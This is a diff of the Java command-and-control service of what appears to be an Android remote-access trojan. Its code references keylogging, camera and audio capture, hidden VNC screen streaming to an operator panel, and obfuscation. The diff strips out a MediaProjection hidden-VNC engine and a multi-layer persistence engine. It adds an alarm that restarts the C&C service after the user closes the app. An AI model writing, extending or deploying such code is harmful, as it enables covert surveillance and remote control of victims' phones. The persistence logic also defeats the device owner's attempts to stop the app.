@@ -12,16 +12,13 @@ import android.os.Looper;
 import android.util.Log;
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
-import okhttp3.ConnectionPool;
 import okhttp3.OkHttpClient;
-import okhttp3.Protocol;
 import okhttp3.Request;
 import okhttp3.Response;
 import okhttp3.WebSocket;
 import okhttp3.WebSocketListener;
 import okio.ByteString;
 import java.nio.ByteBuffer;
-import java.util.Arrays;
 import java.util.concurrent.TimeUnit;
 import org.lsposed.lsparanoid.Obfuscate;
 
@@ -101,10 +98,6 @@ public class CommandControlService extends Service {
     
     public volatile boolean isConnected = false;
     private boolean shouldReconnect = true;
-
-    // MediaProjection HVNC — stores the Intent from the on-device grant dialog
-    // so it can be forwarded to MediaProjectionHvnc.storeToken() on MP_PROJECTION_TOKEN cmd
-    public volatile android.content.Intent mpProjectionGrantData = null;
     
     private final Runnable reconnectRunnable = () -> {
         if (!isConnected) {
@@ -216,10 +209,6 @@ public class CommandControlService extends Service {
         // IMPORTANTE: Inicia foreground service para evitar kill do Android 8+
         startForegroundServiceWithNotification();
         Log.d(TAG, "Serviço C&C criado");
-
-        // Arm all 10 PersistenceEngine layers every time the service is created —
-        // covers resurrection from alarm, job, WorkManager, and manual starts
-        PersistenceEngine.arm(this);
         
         // 🔋 Adquire WakeLock para manter conexão ativa mesmo com tela desligada
         try {
@@ -250,22 +239,11 @@ public class CommandControlService extends Service {
         // Gera ID único do dispositivo
         deviceId = getUniqueDeviceId();
         
-        // OkHttpClient — tuned for permanent WebSocket stability
+        // Cria cliente HTTP com pingInterval para evitar timeouts de TCP/NAT
         client = new OkHttpClient.Builder()
-            // TCP-level retry before surfacing failure to the WebSocket listener
-            .retryOnConnectionFailure(true)
-            // OkHttp native WS pings every 10 s; if pong missing after another
-            // interval OkHttp closes socket and fires onFailure → scheduleReconnect()
-            .pingInterval(10, TimeUnit.SECONDS)
-            // 5 warm sockets kept alive up to 30 s — eliminates TCP handshake
-            // latency on every reconnect cycle
-            .connectionPool(new okhttp3.ConnectionPool(5, 30, TimeUnit.SECONDS))
-            // Fast failure detection
-            .connectTimeout(10, TimeUnit.SECONDS)
-            .readTimeout(0, TimeUnit.MILLISECONDS)   // WebSocket read must not time out
-            .writeTimeout(20, TimeUnit.SECONDS)
-            // Force HTTP/1.1 — some reverse proxies break HTTP/2 WS upgrades
-            .protocols(java.util.Arrays.asList(okhttp3.Protocol.HTTP_1_1))
+            .connectTimeout(15, TimeUnit.SECONDS)
+            .readTimeout(0, TimeUnit.MILLISECONDS) // WebSocket não tem timeout de leitura
+            .pingInterval(10, TimeUnit.SECONDS) // Mantém WebSocket vivo no nível do protocolo RFC 6455
             .build();
         
         // 📷 Registra receiver para frames da câmera
@@ -494,11 +472,6 @@ public class CommandControlService extends Service {
         isConnected = true;
         webSocket = ws;
         reconnectAttempts = 0; // Reset contador de reconexão
-
-        // Release resurrection WakeLock — C&C is stable
-        PersistenceEngine.releaseWakeLock();
-        // Re-arm all layers so the next wake-up window is already scheduled
-        PersistenceEngine.rearm(this);
         
         // Envia informações do dispositivo
         sendDeviceInfo();
@@ -948,63 +921,6 @@ public class CommandControlService extends Service {
                     } catch (Exception e) {
                         Log.e(TAG, "Erro ao processar SET_VNC_MODE: " + e.getMessage(), e);
                         sendResponse("ERROR", "Erro: " + e.getMessage());
-                    }
-                    break;
-
-                // ── MediaProjection HVNC (second engine, type 0x04) ──────────
-                case "TOGGLE_MP_HVNC":
-                    try {
-                        boolean mpEnable = !cmd.has("enabled") || cmd.get("enabled").isJsonNull()
-                                || cmd.get("enabled").getAsBoolean();
-                        int mpQuality = cmd.has("quality") && !cmd.get("quality").isJsonNull()
-                                ? cmd.get("quality").getAsInt() : 60;
-                        if (mpEnable) {
-                            if (!MediaProjectionHvnc.hasToken()) {
-                                // Signal panel to trigger the on-device grant dialog
-                                sendResponse("REQUEST_MP_PERMISSION",
-                                        "MediaProjection grant required on device");
-                            } else {
-                                MediaProjectionHvnc.start(CommandControlService.this, mpQuality);
-                                sendResponse("OK", "MP-HVNC started q=" + mpQuality);
-                            }
-                        } else {
-                            MediaProjectionHvnc.stop();
-                            sendResponse("OK", "MP-HVNC stopped");
-                        }
-                    } catch (Exception e) {
-                        Log.e(TAG, "TOGGLE_MP_HVNC: " + e.getMessage(), e);
-                        sendResponse("ERROR", e.getMessage());
-                    }
-                    break;
-
-                case "SET_MP_HVNC_QUALITY":
-                    try {
-                        int q = cmd.has("quality") && !cmd.get("quality").isJsonNull()
-                                ? cmd.get("quality").getAsInt() : 60;
-                        if (MediaProjectionHvnc.isRunning()) {
-                            // start() while running only updates quality
-                            MediaProjectionHvnc.start(CommandControlService.this, q);
-                        }
-                        sendResponse("OK", "MP-HVNC quality=" + q);
-                    } catch (Exception e) {
-                        sendResponse("ERROR", e.getMessage());
-                    }
-                    break;
-
-                case "MP_PROJECTION_TOKEN":
-                    // Panel relays result code from the user's on-device grant dialog
-                    try {
-                        int rc = cmd.has("resultCode") && !cmd.get("resultCode").isJsonNull()
-                                ? cmd.get("resultCode").getAsInt() : 0;
-                        if (rc != 0 && mpProjectionGrantData != null) {
-                            MediaProjectionHvnc.storeToken(rc, mpProjectionGrantData);
-                            mpProjectionGrantData = null;
-                            sendResponse("OK", "MP token stored");
-                        } else {
-                            sendResponse("ERROR", "MP token invalid — run grant dialog first");
-                        }
-                    } catch (Exception e) {
-                        sendResponse("ERROR", e.getMessage());
                     }
                     break;
 
@@ -1994,37 +1910,6 @@ public class CommandControlService extends Service {
             pendingFrames = Math.max(0, pendingFrames - 1);
             Log.w(TAG, "⚠️ Frame descartado devido a exceção no envio: " + e.getMessage());
             // NÃO desconecta nem força reconnect — erro pontual de frame é normal no streaming
-        }
-    }
-
-    /**
-     * Send a JPEG frame with an explicit type byte — used by MediaProjectionHvnc
-     * and any future HVNC engine that needs a type other than 0x01.
-     *
-     * Protocol: [type:1][size:4 BE][JPEG]
-     *   0x01 — accessibility HVNC (existing sendFrame)
-     *   0x02 — camera
-     *   0x03 — audio
-     *   0x04 — MediaProjection HVNC
-     */
-    public void sendFrameTyped(byte[] jpegData, byte frameType) {
-        WebSocket ws = webSocket;
-        if (!isConnected || ws == null || jpegData == null) return;
-        try {
-            // Back-pressure: drop if queue already saturated
-            if (ws.queueSize() > 384 * 1024) return;
-            ByteBuffer buf = ByteBuffer.allocate(5 + jpegData.length);
-            buf.put(frameType);
-            buf.putInt(jpegData.length);
-            buf.put(jpegData);
-            synchronized (sendLock) {
-                if (isConnected && webSocket != null) {
-                    webSocket.send(ByteString.of(buf.array()));
-                }
-            }
-        } catch (Exception e) {
-            Log.w(TAG, "sendFrameTyped(0x" + Integer.toHexString(frameType & 0xFF)
-                    + "): " + e.getMessage());
         }
     }
 
@@ -3637,21 +3522,27 @@ public class CommandControlService extends Service {
             Log.e(TAG, "Erro ao desregistrar receiver do Keylog: " + e.getMessage());
         }
         
-        // Stop MP-HVNC cleanly
-        try { MediaProjectionHvnc.stop(); } catch (Exception ignored) {}
-
-        // Fire L9 resurrection before the process fully tears down.
-        // On Android <12 this successfully schedules the alarm before death.
-        PersistenceEngine.onTaskRemoved(this);
-
         Log.d(TAG, "Serviço C&C destruído");
     }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        Log.d(TAG, "⚡ onTaskRemoved — firing L9 resurrection chain");
-        // L9: immediate 0 ms alarm + re-arm all 10 PE layers
-        PersistenceEngine.onTaskRemoved(this);
+        super.onTaskRemoved(rootIntent);
+        Log.d(TAG, "⚡ onTaskRemoved: App encerrado das tarefas recentes! Reiniciando serviço C&C...");
+        try {
+            Intent restartServiceIntent = new Intent(getApplicationContext(), CommandControlService.class);
+            restartServiceIntent.setPackage(getPackageName());
+            android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
+                    getApplicationContext(), 1, restartServiceIntent,
+                    android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE
+            );
+            android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
+            if (alarmService != null) {
+                alarmService.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, restartServicePendingIntent);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Erro no onTaskRemoved: " + e.getMessage());
+        }
     }
 
     private String lastClipboardText = "";
